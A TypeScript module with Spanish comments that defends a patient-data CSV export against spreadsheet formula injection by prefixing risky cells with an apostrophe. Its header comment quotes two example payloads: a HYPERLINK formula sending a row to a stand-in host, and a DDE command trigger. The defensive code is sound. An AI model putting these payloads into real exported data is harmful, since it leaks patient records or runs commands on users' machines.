/**
 * Celdas CSV seguras (A2b-S-vis, 30-sep). Módulo puro: sin "use server" ni
 * imports de servidor, para testearlo en unit.
 *
 * Por qué: el export de pacientes (`/api/pacientes/export`) vuelca texto que
 * tipeó cualquiera — nombre, email, teléfono, y desde la reserva pública lo
 * que escribe un paciente anónimo. Excel / LibreOffice / Sheets interpretan
 * una celda que empieza con `=`, `+`, `-` o `@` (y tab / CR, que algunos
 * parsers descartan antes de mirar el primer carácter) como FÓRMULA:
 * `=HYPERLINK("http://x/?"&A1,"ver")` exfiltra la fila al hacer clic y
 * `=cmd|...` dispara DDE en Excel viejo (CSV/formula injection, OWASP).
 * Mitigación estándar: anteponer `'` para forzar texto. Se aplica a TODA
 * celda de texto libre; los campos que genera el servidor (ids, ISO dates,
 * "3/10") no la necesitan, pero pasar por acá tampoco los rompe.
 *
 * Trade-off aceptado: un teléfono "+54 11…" sale como "'+54 11…" (se ve el
 * apóstrofo en un editor de texto; Excel lo oculta). Es preferible a dejar
 * abierto el vector por un prefijo legítimo.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/** Neutraliza una celda que una planilla ejecutaría como fórmula. */
export function neutralizeFormula(value: string): string {
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}

/**
 * Celda CSV (RFC 4180) con la neutralización de fórmulas aplicada ANTES de
 * citar: si se citara primero, el `'` quedaría fuera de las comillas.
 */
export function csvCell(value: string | null | undefined): string {
  if (value == null) return "";
  const safe = neutralizeFormula(String(value));
  const needsQuote = /[",\n\r]/.test(safe);
  const esc = safe.replace(/"/g, '""');
  return needsQuote ? `"${esc}"` : esc;
}

/** Una fila CSV a partir de celdas crudas. */
export function csvRow(cells: readonly (string | null | undefined)[]): string {
  return cells.map(csvCell).join(",");
}
